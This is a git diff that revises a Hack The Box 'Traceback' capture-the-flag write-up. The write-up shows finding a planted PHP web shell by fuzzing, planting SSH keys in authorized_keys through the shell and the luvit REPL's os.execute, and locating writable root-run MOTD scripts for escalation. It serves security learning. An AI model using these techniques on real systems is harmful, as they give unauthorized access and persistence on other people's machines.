@@ -43,6 +43,8 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 40.09 seconds
 ```
 
+### SSH
+
 The only ports that were open were 22 -SSH and 80 - HTTP. I first tried connecting to ssh:
 
 ```text
@@ -54,6 +56,8 @@ The only ports that were open were 22 -SSH and 80 - HTTP. I first tried connecti
 
 I wasn't able to login, but I noticed a banner saying that the system had been owned due to poor configurations by someone named `Xh4H`. 
 
+### HTTP
+
 ![](../../.gitbook/assets/screenshot_2020-06-21_16-48-34%20%281%29.png)
 
 Connecting to port 80 through a web browser gave me a very similar message. It also said something about a backdoor, so I fired up `gobuster` to see if I could find any other pages since there were no other hints or ways to progress.  
@@ -64,13 +68,15 @@ gobuster dir -u http://10.10.10.181 -w /usr/share/wordlists/dirbuster/directory-
 
 Unfortunately this did not get me anywhere, as the connection was blocked and I wasn't able to find anything.
 
+### FREE INTERNETZZZ - Twitter OSINT
+
 Next I tried a web search for `FREE INTERNETZZZ`, which led me to Twitter of all places.
 
 ![](../../.gitbook/assets/free-internetzzzz.png)
 
 "Pretty interesting collection of webshells:"  says the [author](https://twitter.com/RiftWhiteHat/status/1237311680276647936) of this machine...and posted around the same time as the release \(14 Mar 2020 - See [info card](traceback-write-up.md#overview)\).  This felt a lot like an OSINT-type challenge to me.   Clicking on the post led to a collection of "Some of the best web shells that you might need" at [https://github.com/TheBinitGhimire/Web-Shells](https://github.com/TheBinitGhimire/Web-Shells).
 
-I didn't know which web shell was used, and the hint left by @XH4H only led to a GitHub repository with a collection of shells. I downloaded them all and started poking through the code to see if anything looked familiar, but most of it was obfuscated and I couldn't find the phrase `FREE INTERNETZZZ` in any of the files. So, I created a list of the filenames and used `wfuzz` to check to see if any of them had been uploaded to the site. _\(And I hoped that the filename hadn't been changed!\)_
+I didn't know which web shell was used, and the hint left by `Xh4H` only led to a GitHub repository with a collection of shells. I downloaded them all and started poking through the code to see if anything looked familiar, but most of it was obfuscated and I couldn't find the phrase `FREE INTERNETZZZ` in any of the files. So, I created a list of the filenames and used `wfuzz` to check to see if any of them had been uploaded to the site. _\(And I hoped that the filename hadn't been changed!\)_
 
 ```bash
 zweilos@kali:~/htb/traceback/webshells$ ls -1 > webshells
@@ -98,6 +104,8 @@ Requests/sec.: 18.04628
 ```
 
 ## Initial Foothold
+
+### Smevk\_Pathan Shell v3
 
 Using `wfuzz` I was able to find the web shell used at `http://10.10.10.181/smevk.php`.I navigated to this page and got a login screen.
 
@@ -190,28 +198,24 @@ if( get_magic_quotes_gpc() ) {
 function printLogin() {
  if ($_POST['pass'] != $auth_pass && $_POST['uname'] != $UserName) {
     $status = 'Wrong Password or UserName :(';
-
-
 }
-
-?base64: invalid input
 ```
 
-After doing some troubleshooting and looking into the code it seems as if the web shell itself is looking for a HTTP\_USER\_AGENT with 'Google' in it. Not sure why this might interfere since it seems to give a 404 error if the user agent IS Google...This may be just to keep the Google bots from crawling the page and discovering the backdoor.  I didn't poke into the code too far, because I had gotten it working and wanted to move on.  Perhaps this is something I could look into in the future.
+After doing some troubleshooting and looking into the code it seemed as if the web shell itself was looking for a HTTP\_USER\_AGENT with 'Google' in it. I wasn't sure why this might interfere since it seems to give a 404 error if the user agent IS Google. This may be just to keep the Google bots from crawling the page and discovering the backdoor.  Using the unPHP decoder site [https://www.unphp.net/decode/9e310714b0ca99497d4a486d220d34f7/](https://www.unphp.net/decode/9e310714b0ca99497d4a486d220d34f7/) I read through the rest of the code of the backdoor to see if I could find anything that would cause it to not work in Firefox, but I didn't see anything obvious.
 
 ## Road to User
 
-[https://www.ssh.com/ssh/keygen/](https://www.ssh.com/ssh/keygen/)
-
-`ssh-copy-id -i ~/.ssh/tatu-key-ecdsa user@host` \(site says this works remotely, but would need password it seems so I did it the old fashioned way\)
-
 ![](../../.gitbook/assets/screenshot_2020-06-22_17-41-38.png)
 
-I noticed that the webshell told me that the username we had control of was `webadmin`, so I decided to try to add my public SSH key to the `.ssh/authorized_keys` file and see if it would let me log in that way. I entered the command`echo "ssh-rsa AAAA<my_public_key> zweilos@kali" >> /home/webadmin/.ssh/authorized_keys` into the `execute` field in the web shell
+I noticed that the web shell told me that the username we had control of was `webadmin`, so I decided to try to add my public SSH key to the `.ssh/authorized_keys` file of that user to see if it would let me log in that way. I entered the command `echo "ssh-rsa AAAA<my_public_key> zweilos@kali" >> /home/webadmin/.ssh/authorized_keys` into the `Console` field of the web shell.  _\(Notice the append operator `>>`?  Please be nice to your fellow players and don't overwrite the whole file with `>`!\)_
+
+{% hint style="info" %}
+According to [https://www.ssh.com/ssh/keygen/](https://www.ssh.com/ssh/keygen/) you can also do this remotely from a terminal using**`ssh-copy-id -i ~/.ssh/tatu-key-ecdsa user@host`** but you need to be able to authenticate to the machine already to do this.  
+{% endhint %}
 
 ### Enumeration as `webadmin`
 
-After that it was easy to just SSH into the machine using my own private key.
+After uploading my public key it was easy to just SSH into the machine using my own private key.
 
 ```text
 zweilos@kali:~/htb/traceback$ ssh webadmin@10.10.10.181
@@ -228,7 +232,7 @@ webadmin
 traceback
 ```
 
-First thing, see if we can execute anything with `sudo` using the `-l` flag
+The first thing I do when getting a new user account is see what privileges I have and if I can execute anything with `sudo` by using the `-l` flag.
 
 ```text
 webadmin@traceback:~$ sudo -l
@@ -240,7 +244,7 @@ User webadmin may run the following commands on traceback:
     (sysadmin) NOPASSWD: /home/sysadmin/luvit
 ```
 
-seems like we can execute the `luvit` program in `sysadmin`'s home folder as that user
+I was able to execute the `luvit` program in `sysadmin`'s home folder as that user without a password.
 
 ### Making user creds
 
@@ -250,14 +254,13 @@ Welcome to the Luvit repl!
 >
 ```
 
-```text
-Repl
-#
+By reading a bit on `luvit`, I discovered it was essentially a `lua` programming language shell.  
 
-Implementation of a read-execute-print-loop in Luvit. Used by the Luvit repl which is returned when the Luvit binary is executed without args.
-```
+> Repl\#
+>
+> Implementation of a read-execute-print-loop in Luvit. Used by the Luvit repl which is returned when the Luvit binary is executed without args.
 
-from [https://www.lua.org/pil/22.2.html](https://www.lua.org/pil/22.2.html) =&gt; os.execute\("mkdir " .. dirname\)
+From [https://www.lua.org/pil/22.2.html](https://www.lua.org/pil/22.2.html) I discovered I could execute system commands by using the syntax `os.execute("mkdir " .. dirname)`. 
 
 ```lua
 > os.execute("ls")
@@ -268,7 +271,9 @@ sh: 1: catnote.txt: not found
 nil     'exit'  127
 ```
 
-So you will need to make sure to put a space between the command and the argument manually, as this seems to just concatenate the two strings then execute. The space can either be at the end of the command or the beginning of the argugments.
+_A quick troubleshooting note... you will need to make sure to put a space between the command and the argument manually, as this seems to just concatenate the two strings then executes. The space can either be at the end of the command or the beginning of the arguments._
+
+### User.txt
 
 ```lua
 > os.execute("cat" .. " note.txt")
@@ -285,15 +290,15 @@ true    'exit'  0
 true    'exit'  0
 ```
 
-### User.txt
-
 ### Getting a shell as `sysadmin`
 
-[https://simion.com/info/calling\_external\_programs.html](https://simion.com/info/calling_external_programs.html)
+While reading up on how to execute commands in this `luvit` shell, I came across this page [https://simion.com/info/calling\_external\_programs.html](https://simion.com/info/calling_external_programs.html) which described a way to execute commands that were more complex than a simple "command" .. "argument" format.
 
 ```text
 > os.execute 'echo "ssh-rsa AAAA<my_public_key> zweilos@kali" >> /home/sysadmin/.ssh/authorized_keys'
 ```
+
+I used this to once again copy my public SSH key to the new user, and used SSH to login.
 
 ```text
 zweilos@kali:~/htb/traceback$ ssh sysadmin@10.10.10.181
@@ -315,12 +320,12 @@ sysadmin
 
 ### Enumeration as `sysadmin`
 
-start out in `/bin/sh`, which is kind of limiting \(no history or tab completion, etc\) `perl -e 'exec "/bin/bash";'` gets a nice bash shell \(python was not installed...but python3 is... dummy!\)
+I started out in `/bin/sh`, which was pretty limiting \(no history, arrow keys, or tab completion, etc\) so I tried to use my standard python PTY shell upgrade trick, but it didn't work.  _It was late and I was tired, so I looked up how to do it in Perl, since it was installed, using `perl -e 'exec "/bin/bash";'`.   When I went back to it the next morning, I realized that indeed python was not installed...but python3 was!  Doh!_
 
-see all processes from root user `ps -U root -u root ux`
+I wasn't able to check sudo permissions without a password, so I checked running processes next.  I noticed a strange `sleep 30` running by root, so I decided to look further into what processes were being run as root with `ps -U root -u root` _\(from the man page\)_.
 
 ```text
-sysadmin@traceback:/$ ps -U root -u root u
+sysadmin@traceback:/$ ps -U root -u root
 USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
 ...snipped
 root        268  0.0  0.4 128080 17252 ?        S<s  14:17   0:00 /lib/systemd/systemd-journald
@@ -342,7 +347,7 @@ root      10212  0.0  0.0   4628   812 ?        Ss   16:52   0:00 /bin/sh -c sle
 root      10213  0.0  0.0   7468   840 ?        S    16:52   0:00 sleep 30
 ```
 
-There is a script running every 30 seconds which restores a backup of the MOTD...I wonder why? I checked both of these directories to see if could edit the files
+There was a script running every 30 seconds which restored a backup of the MOTD \(message of the day\) which definitely looked odd, so I checked both of the directories in the command to see if could find anything useful.
 
 ```text
 sysadmin@traceback:/var/backups/.update-motd.d$ cd /etc/update-motd.d/
@@ -357,7 +362,7 @@ drwxr-xr-x 80 root root     4096 Mar 16 03:55 ..
 -rwxrwxr-x  1 root sysadmin  299 Jun 22 17:07 91-release-upgrade
 ```
 
-These files are editable by `sysadmin`.
+Interestingly, the files in `/etc/update-motd.d/` were editable by `sysadmin`. _\(The backups were not\)._
 
 ```text
 sysadmin@traceback:/etc/update-motd.d$ cat 00-header 
